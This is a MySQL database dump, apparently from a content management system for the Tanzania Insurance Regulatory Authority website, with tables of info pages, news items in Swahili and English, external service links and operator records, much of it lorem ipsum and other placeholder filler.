INSERT INTO `more_infos` VALUES (1,'About TIRA','About TIRA','',NULL,NULL,NULL,1,'about-tira',1,'about-tira','5f0814d557088a67edbbe7b8a2ea1fa5.jpeg','2021-08-02 02:58:21','2022-06-21 03:54:30'),(2,'Consumer Services','Consumer Services','',NULL,NULL,NULL,1,'consumer-services',1,'Consumer Services','19c85af6feaf700d95b0653f677ebdf9.jpeg','2021-09-02 02:58:21','2022-06-21 03:53:48'),(3,'Licensed Entities','Licensed Entities','',NULL,NULL,NULL,1,'licensed-entities',1,'licensed-entities','295ef015dd5970f514a905c3dd448b42.jpeg','2021-09-02 02:58:21','2022-08-07 13:20:41'),(4,'Public Relations','Public Relations','',NULL,NULL,NULL,1,'public-relations',1,'public-relations','93179b6450b24999094300288cd655a4.jpeg','2022-01-02 02:58:21','2022-06-21 03:52:18'),(6,'Tanzania Insurance Regulatory Authority, Leadership','Tanzania Insurance Regulatory Authority, Leadership',NULL,NULL,'<p>TIRA leadership is completely transparent, accountable, clean &amp; super efficient in bringing about development initiatives across government sectors</p>','<p>TIRA leadership is completely transparent, accountable, clean &amp; super efficient in bringing about development initiatives across government sectors</p>',1,'tira-leadership',1,NULL,NULL,'2022-08-10 17:16:50','2022-08-10 17:16:50'),(7,'TIRA Online Services, Information Systems','TIRA Online Services, Information Systems',NULL,NULL,'<p>TIRA is committed to providing quality services to her customers, therefore we have built online services for our customers in order to be served quickly and efficiently, please go to one of our online services below.</p>','<p>TIRA is committed to providing quality services to her customers, therefore we have built online services for our customers in order to be served quickly and efficiently, please go to one of our online services below.</p>',1,'online-services',1,NULL,NULL,'2022-08-10 17:19:18','2022-08-10 17:19:18'),(8,'What is Happening at TIRA, Latest News','What is Happening at TIRA, Latest News',NULL,NULL,'<p>TIRA leadership is completely transparent, accountable, clean &amp; super efficient in bringing about development initiatives across government sectors</p>','<p>TIRA leadership is completely transparent, accountable, clean &amp; super efficient in bringing about development initiatives across government sectors</p>',1,'latest-news',1,NULL,NULL,'2022-08-10 17:22:17','2022-08-10 18:50:55'),(9,'Our Partners Across the World','Our Partners Across the World',NULL,NULL,'<p>TIRA is a member of the following International organizations</p>','<p>TIRA is a member of the following International organizations</p>',1,'tira-partners',1,NULL,NULL,'2022-08-10 20:39:10','2022-08-10 20:39:10');
/*!40000 ALTER TABLE `more_infos` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `news`
--

DROP TABLE IF EXISTS `news`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `news` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `summary_sw` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `summary_en` text COLLATE utf8mb4_unicode_ci,
  `content_sw` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `content_en` text COLLATE utf8mb4_unicode_ci,
  `active` tinyint(1) NOT NULL DEFAULT '1',
  `user_id` int(11) NOT NULL,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `photo_url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `news`
--

LOCK TABLES `news` WRITE;
/*!40000 ALTER TABLE `news` DISABLE KEYS */;
INSERT INTO `news` VALUES (1,'Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika','Changes in Second Stakeholders General Meeting in Second Stakeholders General','',NULL,'<p>Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;</p>','<p>Changes in Second Stakeholders General Meeting&nbsp;&nbsp;Changes in Second Stakeholders General Meeting&nbsp;&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;</p>',1,1,'changes-in-second-stakeholders-general-meeting','5f0814d557088a67edbbe7b8a2ea1fa5.jpeg','2021-08-02 02:58:21','2022-06-21 03:54:30'),(2,'The standard chunk of Lorem Ipsum used since the 1500s is reproduced below for those interested. Sections 1.10.32 and 1.10.33 from \"de Finibus Bonorum et Malorum\" by Cicero are also reproduce','The standard chunk of Lorem Ipsum used since the 1500s is reproduced below for those interested. Sections 1.10.32 and 1.10.33 from \"de Finibus Bonorum et Malorum\" by Cicero are also reproduce','',NULL,'<p>Changes in Second Stakeholders General Meeting&nbsp;The standard chunk of Lorem Ipsum used since the 1500s is reproduced below for those interested. Sections 1.10.32 and 1.10.33 from &quot;de Finibus Bonorum et Malorum&quot; by Cicero are also reproduced in their exact original form, accompanied by English versions from the 1914 translation by H. Rackham.&nbsp;The standard chunk of Lorem Ipsum used since the 1500s is reproduced below for those interested. Sections 1.10.32 and 1.10.33 from &quot;de Finibus Bonorum et Malorum&quot; by Cicero are also reproduced in their exact original form, accompanied by English versions from the 1914 translation by H. RackhamChanges in Second Stakeholders General Meeting&nbsp;The standard chunk of Lorem Ipsum used since the 1500s is reproduced below for those interested. Sections 1.10.32 and 1.10.33 from &quot;de Finibus Bonorum et Malorum&quot; by Cicero are also reproduced in their exact original form, accompanied by English versions from the 1914 translation by H. Rackham.&nbsp;The standard chunk of Lorem Ipsum used since the 1500s is reproduced below for those interested. Sections 1.10.32 and 1.10.33 from &quot;de Finibus Bonorum et Malorum&quot; by Cicero are also reproduced in their exact original form, accompanied by English versions from the 1914 translation by H. Rackham</p>\r\n\r\n<p>Changes in Second Stakeholders General Meeting&nbsp;The standard chunk of Lorem Ipsum used since the 1500s is reproduced below for those interested. Sections 1.10.32 and 1.10.33 from &quot;de Finibus Bonorum et Malorum&quot; by Cicero are also reproduced in their exact original form, accompanied by English versions from the 1914 translation by H. Rackham.&nbsp;The standard chunk of Lorem Ipsum used since the 1500s is reproduced below for those interested. Sections 1.10.32 and 1.10.33 from &quot;de Finibus Bonorum et Malorum&quot; by Cicero are also reproduced in their exact original form, accompanied by English versions from the 1914 translation by H. RackhamChanges in Second Stakeholders General Meeting&nbsp;The standard chunk of Lorem Ipsum used since the 1500s is reproduced below for those interested. Sections 1.10.32 and 1.10.33 from &quot;de Finibus Bonorum et Malorum&quot; by Cicero are also reproduced in their exact original form, accompanied by English versions from the 1914 translation by H. Rackham.&nbsp;The standard chunk of Lorem Ipsum used since the 1500s is reproduced below for those interested. Sections 1.10.32 and 1.10.33 from &quot;de Finibus Bonorum et Malorum&quot; by Cicero are also reproduced in their exact original form, accompanied by English versions from the 1914 translation by H. RackhamChanges in Second Stakeholders General Meeting&nbsp;The standard chunk of Lorem Ipsum used since the 1500s is reproduced below for those interested. Sections 1.10.32 and 1.10.33 from &quot;de Finibus Bonorum et Malorum&quot; by Cicero are also reproduced in their exact original form, accompanied by English versions from the 1914 translation by H. Rackham.&nbsp;The standard chunk of Lorem Ipsum used since the 1500s is reproduced below for those interested. Sections 1.10.32 and 1.10.33 from &quot;de Finibus Bonorum et Malorum&quot; by Cicero are also reproduced in their exact original form, accompanied by English versions from the 1914 translation by H. RackhamChanges in Second Stakeholders General Meeting&nbsp;The standard chunk of Lorem Ipsum used since the 1500s is reproduced below for those interested. Sections 1.10.32 and 1.10.33 from &quot;de Finibus Bonorum et Malorum&quot; by Cicero are also reproduced in their exact original form, accompanied by English versions from the 1914 translation by H. Rackham.&nbsp;The standard chunk of Lorem Ipsum used since the 1500s is reproduced below for those interested. Sections 1.10.32 and 1.10.33 from &quot;de Finibus Bonorum et Malorum&quot; by Cicero are also reproduced in their exact original form, accompanied by English versions from the 1914 translation by H. Rackham</p>','<p>Changes in Second Stakeholders General Meeting&nbsp;The standard chunk of Lorem Ipsum used since the 1500s is reproduced below for those interested. Sections 1.10.32 and 1.10.33 from &quot;de Finibus Bonorum et Malorum&quot; by Cicero are also reproduced in their exact original form, accompanied by English versions from the 1914 translation by H. Rackham.&nbsp;The standard chunk of Lorem Ipsum used since the 1500s is reproduced below for those interested. Sections 1.10.32 and 1.10.33 from &quot;de Finibus Bonorum et Malorum&quot; by Cicero are also reproduced in their exact original form, accompanied by English versions from the 1914 translation by H. RackhamChanges in Second Stakeholders General Meeting&nbsp;The standard chunk of Lorem Ipsum used since the 1500s is reproduced below for those interested. Sections 1.10.32 and 1.10.33 from &quot;de Finibus Bonorum et Malorum&quot; by Cicero are also reproduced in their exact original form, accompanied by English versions from the 1914 translation by H. Rackham.&nbsp;The standard chunk of Lorem Ipsum used since the 1500s is reproduced below for those interested. Sections 1.10.32 and 1.10.33 from &quot;de Finibus Bonorum et Malorum&quot; by Cicero are also reproduced in their exact original form, accompanied by English versions from the 1914 translation by H. Rackham</p>\r\n\r\n<p>Changes in Second Stakeholders General Meeting&nbsp;The standard chunk of Lorem Ipsum used since the 1500s is reproduced below for those interested. Sections 1.10.32 and 1.10.33 from &quot;de Finibus Bonorum et Malorum&quot; by Cicero are also reproduced in their exact original form, accompanied by English versions from the 1914 translation by H. Rackham.&nbsp;The standard chunk of Lorem Ipsum used since the 1500s is reproduced below for those interested. Sections 1.10.32 and 1.10.33 from &quot;de Finibus Bonorum et Malorum&quot; by Cicero are also reproduced in their exact original form, accompanied by English versions from the 1914 translation by H. RackhamChanges in Second Stakeholders General Meeting&nbsp;The standard chunk of Lorem Ipsum used since the 1500s is reproduced below for those interested. Sections 1.10.32 and 1.10.33 from &quot;de Finibus Bonorum et Malorum&quot; by Cicero are also reproduced in their exact original form, accompanied by English versions from the 1914 translation by H. Rackham.&nbsp;The standard chunk of Lorem Ipsum used since the 1500s is reproduced below for those interested. Sections 1.10.32 and 1.10.33 from &quot;de Finibus Bonorum et Malorum&quot; by Cicero are also reproduced in their exact original form, accompanied by English versions from the 1914 translation by H. RackhamChanges in Second Stakeholders General Meeting&nbsp;The standard chunk of Lorem Ipsum used since the 1500s is reproduced below for those interested. Sections 1.10.32 and 1.10.33 from &quot;de Finibus Bonorum et Malorum&quot; by Cicero are also reproduced in their exact original form, accompanied by English versions from the 1914 translation by H. Rackham.&nbsp;The standard chunk of Lorem Ipsum used since the 1500s is reproduced below for those interested. Sections 1.10.32 and 1.10.33 from &quot;de Finibus Bonorum et Malorum&quot; by Cicero are also reproduced in their exact original form, accompanied by English versions from the 1914 translation by H. RackhamChanges in Second Stakeholders General Meeting&nbsp;The standard chunk of Lorem Ipsum used since the 1500s is reproduced below for those interested. Sections 1.10.32 and 1.10.33 from &quot;de Finibus Bonorum et Malorum&quot; by Cicero are also reproduced in their exact original form, accompanied by English versions from the 1914 translation by H. Rackham.&nbsp;The standard chunk of Lorem Ipsum used since the 1500s is reproduced below for those interested. Sections 1.10.32 and 1.10.33 from &quot;de Finibus Bonorum et Malorum&quot; by Cicero are also reproduced in their exact original form, accompanied by English versions from the 1914 translation by H. Rackham</p>',1,1,'changes-in-second-stakeholders-general-meeting-1','19c85af6feaf700d95b0653f677ebdf9.jpeg','2021-09-02 02:58:21','2022-06-21 03:53:48'),(3,'Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika','Changes in Second Stakeholders General Meetings and more','',NULL,'<p>Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;</p>','<p>Changes in Second Stakeholders General Meeting&nbsp;&nbsp;Changes in Second Stakeholders General Meeting&nbsp;&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;</p>',1,1,'changes-in-second-stakeholders-general-meeting-2','295ef015dd5970f514a905c3dd448b42.jpeg','2021-09-02 02:58:21','2022-08-07 13:20:41'),(4,'Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika','Changes in Second Stakeholders General Meetings','',NULL,'<p>Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;</p>','<p>Changes in Second Stakeholders General Meeting&nbsp;&nbsp;Changes in Second Stakeholders General Meeting&nbsp;&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;</p>',1,1,'changes-in-second-stakeholders-general-meeting-3','93179b6450b24999094300288cd655a4.jpeg','2022-01-02 02:58:21','2022-06-21 03:52:18'),(5,'Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec mollis consequat.','Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec mollis consequat.','',NULL,'<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec mollis consequat cursus. Nam id justo non turpis gravida dapibus. Cras a facilisis odio, quis accumsan diam. Sed sem neque, pharetra sit amet iaculis et, ullamcorper et risus. Morbi blandit nibh risus, et dignissim dui iaculis sit amet. In convallis lectus vitae tellus malesuada sodales. Sed iaculis aliquam magna at dictum. Aenean pharetra ligula massa, vel fermentum elit elementum pharetra. Integer et viverra purus. Donec molestie ante molestie fringilla scelerisque.</p>\r\n\r\n<p>Donec auctor, enim eleifend fermentum commodo, nisl eros malesuada lorem, eu suscipit ex est vitae lacus. Nullam euismod velit at velit mattis, vel mattis augue fringilla. Nam scelerisque eu quam varius gravida. Sed in ultrices justo, id tristique magna. Maecenas aliquet accumsan volutpat. Quisque commodo nisi at tortor rutrum consectetur. Nunc euismod, turpis ut rhoncus egestas, augue erat eleifend justo, nec vulputate sapien nisi non risus. Nullam eleifend placerat lorem, non vulputate tortor bibendum sed. Duis quis pharetra urna. Ut condimentum, ligula ut auctor malesuada, mi nulla efficitur velit, et eleifend neque mauris nec odio. Mauris a nunc felis. Cras quis leo dictum, rutrum nibh non, venenatis odio. Nam porttitor eros sed ipsum cursus, vitae pellentesque leo feugiat. Morbi magna leo, vehicula sed nisl eget, faucibus sollicitudin erat.</p>','<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec mollis consequat cursus. Nam id justo non turpis gravida dapibus. Cras a facilisis odio, quis accumsan diam. Sed sem neque, pharetra sit amet iaculis et, ullamcorper et risus. Morbi blandit nibh risus, et dignissim dui iaculis sit amet. In convallis lectus vitae tellus malesuada sodales. Sed iaculis aliquam magna at dictum. Aenean pharetra ligula massa, vel fermentum elit elementum pharetra. Integer et viverra purus. Donec molestie ante molestie fringilla scelerisque.</p>\r\n\r\n<p>Donec auctor, enim eleifend fermentum commodo, nisl eros malesuada lorem, eu suscipit ex est vitae lacus. Nullam euismod velit at velit mattis, vel mattis augue fringilla. Nam scelerisque eu quam varius gravida. Sed in ultrices justo, id tristique magna. Maecenas aliquet accumsan volutpat. Quisque commodo nisi at tortor rutrum consectetur. Nunc euismod, turpis ut rhoncus egestas, augue erat eleifend justo, nec vulputate sapien nisi non risus. Nullam eleifend placerat lorem, non vulputate tortor bibendum sed. Duis quis pharetra urna. Ut condimentum, ligula ut auctor malesuada, mi nulla efficitur velit, et eleifend neque mauris nec odio. Mauris a nunc felis. Cras quis leo dictum, rutrum nibh non, venenatis odio. Nam porttitor eros sed ipsum cursus, vitae pellentesque leo feugiat. Morbi magna leo, vehicula sed nisl eget, faucibus sollicitudin erat.</p>',1,1,'lorem-ipsum-dolor-sit-amet-consectetur-adipiscing-elit-donec-mollis-consequat','53f114f1c69175b8f7b88ea9c1a9596b.jpeg','2022-01-08 13:30:30','2022-06-21 03:50:58'),(7,'SMZ yaridhishwa Utendaji Soko la Bima Nchini','SMZ yaridhishwa Utendaji Soko la Bima Nchini','',NULL,'<h2><a href=\"https://tira.go.tz/content/smz-yaridhishwa-utendaji-soko-la-bima-nchini-0\">SMZ yaridhishwa Utendaji Soko la Bima Nchini</a></h2>','<h2><a href=\"https://tira.go.tz/content/smz-yaridhishwa-utendaji-soko-la-bima-nchini-0\">SMZ yaridhishwa Utendaji Soko la Bima Nchini</a></h2>',1,1,'smz-yaridhishwa-utendaji-soko-la-bima-nchini','65433b588cca01eec677d47d811b4614.jpeg','2022-08-13 17:26:04','2022-08-13 17:26:04'),(8,'RAIS MWINYI AILEKEZA TIRA KUTEKELEZA MABIDILIKO YA SHERIA YA FEDHA.','RAIS MWINYI AILEKEZA TIRA KUTEKELEZA MABIDILIKO YA SHERIA YA FEDHA.','',NULL,'<p>1</p>','<p>1</p>',1,1,'rais-mwinyi-ailekeza-tira-kutekeleza-mabidiliko-ya-sheria-ya-fedha','e3a5d8877d9b6c81528a698dfd31495d.jpeg','2022-08-13 19:52:32','2022-08-13 19:52:32');
/*!40000 ALTER TABLE `news` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `online_services`
--

DROP TABLE IF EXISTS `online_services`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `online_services` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `active` tinyint(1) NOT NULL DEFAULT '1',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `parent` int(11) NOT NULL DEFAULT '0',
  `position` int(11) NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `online_services`
--

LOCK TABLES `online_services` WRITE;
/*!40000 ALTER TABLE `online_services` DISABLE KEYS */;
INSERT INTO `online_services` VALUES (1,'TIC','TIC','http://tic.go.tz',1,'2021-07-28 06:16:15','2021-08-09 12:30:37',0,3),(2,'PMO Uwekezaji','PMO Uwekezaji','http://pmo.go.tz',1,'2021-07-28 06:16:48','2021-08-09 12:30:38',0,6),(3,'TPSF','TPSF','http://tpsf.go.tz',1,'2021-07-28 06:17:24','2021-08-09 12:30:37',0,2),(4,'TRA','TRA','http://trc.go.tz',1,'2021-07-28 06:17:43','2021-08-09 12:30:37',0,4),(5,'Viwanda na Biashara','Viwanda na Biashara','http://wiwanda.com',1,'2021-07-28 06:18:04','2021-08-09 12:30:38',0,5),(6,'TNBP','TNBP','http://tnbp.go.tz',1,'2021-07-28 06:18:36','2022-02-10 12:28:02',0,1);
/*!40000 ALTER TABLE `online_services` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `operators`
--

DROP TABLE IF EXISTS `operators`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `operators` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `phone` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `address` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `active` tinyint(1) NOT NULL DEFAULT '1',
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `operators`
--

LOCK TABLES `operators` WRITE;
/*!40000 ALTER TABLE `operators` DISABLE KEYS */;
INSERT INTO `operators` VALUES (2,'guleay lorem','0692261056','engotheta@gmail.com','P.0 58725',1,'luceedb-lorem','2022-06-30 19:30:16','2022-06-30 19:30:16'),(3,'kayce dev','0692261056','beta@gmail.com','P.0 58725',1,'luceedb-lorem','2022-06-30 19:30:16','2022-06-30 19:30:16'),(4,'shezy benl','0692261057','tups@gmail.com','P.0 58725',1,'luceedb-lorem','2022-06-30 19:30:16','2022-06-30 19:30:16');
/*!40000 ALTER TABLE `operators` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `page_categories`
--

DROP TABLE IF EXISTS `page_categories`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `page_categories` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '0',
  `modifiable` tinyint(1) NOT NULL DEFAULT '1',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `page_categories`
--

LOCK TABLES `page_categories` WRITE;
/*!40000 ALTER TABLE `page_categories` DISABLE KEYS */;
/*!40000 ALTER TABLE `page_categories` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `pages`
--

DROP TABLE IF EXISTS `pages`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `pages` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `has_sidebar` smallint(1) NOT NULL DEFAULT '0',
  `content_sw` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `content_en` text COLLATE utf8mb4_unicode_ci,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=17 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `pages`
--

LOCK TABLES `pages` WRITE;
/*!40000 ALTER TABLE `pages` DISABLE KEYS */;
INSERT INTO `pages` VALUES (6,'Kuhusu Sisi','About us',1,'<p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Maxime mollitia, molestiae quas vel sint commodi repudiandae consequuntur voluptatum laborum numquam blanditiis harum quisquam eius sed odit fugiat iusto fuga praesentium optio, eaque rerum! Provident similique accusantium nemo autem. Veritatis obcaecati tenetur iure eius earum ut molestias architecto voluptate aliquam nihil, eveniet aliquid culpa officia aut! Impedit sit sunt quaerat, odit, tenetur error, harum nesciunt ipsum debitis quas aliquid. Reprehenderit, quia. Quo neque error repudiandae fuga? Ipsa laudantium molestias eos sapiente officiis modi at sunt excepturi expedita sint? Sed quibusdam recusandae alias error harum maxime adipisci amet laborum. Perspiciatis minima nesciunt dolorem! Officiis iure rerum voluptates a cumque velit quibusdam sed amet tempora. Sit laborum ab, eius fugit doloribus tenetur fugiat, temporibus enim commodi iusto libero magni deleniti quod quam consequuntur! Commodi minima excepturi repudiandae velit hic maxime doloremque. Quaerat provident commodi consectetur veniam similique ad earum omnis ipsum saepe, voluptas, hic voluptates pariatur est explicabo fugiat, dolorum eligendi quam cupiditate excepturi mollitia maiores labore suscipit quas? Nulla, placeat. Voluptatem quaerat non architecto ab laudantium modi minima sunt esse temporibus sint culpa, recusandae aliquam numquam totam ratione voluptas quod exercitationem fuga. Possimus quis earum veniam quasi aliquam eligendi, placeat qui corporis!</p>','<p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Maxime mollitia, molestiae quas vel sint commodi repudiandae consequuntur voluptatum laborum numquam blanditiis harum quisquam eius sed odit fugiat iusto fuga praesentium optio, eaque rerum! Provident similique accusantium nemo autem. Veritatis obcaecati tenetur iure eius earum ut molestias architecto voluptate aliquam nihil, eveniet aliquid culpa officia aut! Impedit sit sunt quaerat, odit, tenetur error, harum nesciunt ipsum debitis quas aliquid. Reprehenderit, quia. Quo neque error repudiandae fuga? Ipsa laudantium molestias eos sapiente officiis modi at sunt excepturi expedita sint? Sed quibusdam recusandae alias error harum maxime adipisci amet laborum. Perspiciatis minima nesciunt dolorem! Officiis iure rerum voluptates a cumque velit quibusdam sed amet tempora. Sit laborum ab, eius fugit doloribus tenetur fugiat, temporibus enim commodi iusto libero magni deleniti quod quam consequuntur! Commodi minima excepturi repudiandae velit hic maxime doloremque. Quaerat provident commodi consectetur veniam similique ad earum omnis ipsum saepe, voluptas, hic voluptates pariatur est explicabo fugiat, dolorum eligendi quam cupiditate excepturi mollitia maiores labore suscipit quas? Nulla, placeat. Voluptatem quaerat non architecto ab laudantium modi minima sunt esse temporibus sint culpa, recusandae aliquam numquam totam ratione voluptas quod exercitationem fuga. Possimus quis earum veniam quasi aliquam eligendi, placeat qui corporis!</p>','about-us',1,'2022-07-17 08:04:37','2022-07-17 08:04:37'),(7,'Tunachofanya','What We Do',0,'<h2><a href=\"https://tira.go.tz/functions\">Functions of the Authority</a></h2>\r\n\r\n<ul>\r\n	<li>Registration of insurance agents;</li>\r\n	<li>Registration of insurance assessors and loss surveyors;</li>\r\n	<li>Registration of insurance brokers;</li>\r\n	<li>Registration of insurance companies;</li>\r\n	<li>Registration of Reinsurance companies;</li>\r\n	<li>Inspection of all insurance players;</li>\r\n	<li>Handling insurance complaints from the public; and</li>\r\n	<li>Creation of insurance awareness to the Public.</li>\r\n</ul>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>','<h2>&nbsp;<a href=\"https://tira.go.tz/functions\">Functions of the Authority</a></h2>\r\n\r\n<ul>\r\n	<li>Registration of insurance agents;</li>\r\n	<li>Registration of insurance assessors and loss surveyors;</li>\r\n	<li>Registration of insurance brokers;</li>\r\n	<li>Registration of insurance companies;</li>\r\n	<li>Registration of Reinsurance companies;</li>\r\n	<li>Inspection of all insurance players;</li>\r\n	<li>Handling insurance complaints from the public; and</li>\r\n	<li>Creation of insurance awareness to the Public.</li>\r\n</ul>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>','what-we-do',1,'2022-08-09 14:44:46','2022-08-12 14:58:47'),(8,'Sisi ni Nani','Who we Are',0,'<h2><strong>Who We Are?</strong></h2>\r\n\r\n<p>Enhancing provision of sustainable and regulated Insurance services to Public and Private Institutions</p>\r\n\r\n<p>The Authority is established under the the Insurance Act No.10 of 2009 as Follows. There is established a body to be known as the Tanzania Insurance Regulatory Authority. Subject to the general supervision of the Minister,the Authority shall be charged with the responsibility of coordinating policy and other matters relating to insurance in the United Republic. The Authority shall be a body corporate with perpetual succession and a common seal and shall, in its corporate name, be:-</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Enhancing compliance to policies, laws, regulations, standards, and guidelines related to Insurance and Licensing initiatives in Public and Private Institutions</p>\r\n\r\n<p>The Authority is established under the the Insurance Act No.10 of 2009 as Follows. There is established a body to be known as the Tanzania Insurance Regulatory Authority. Subject to the general supervision of the Minister,the Authority shall be charged with the responsibility of coordinating policy and other 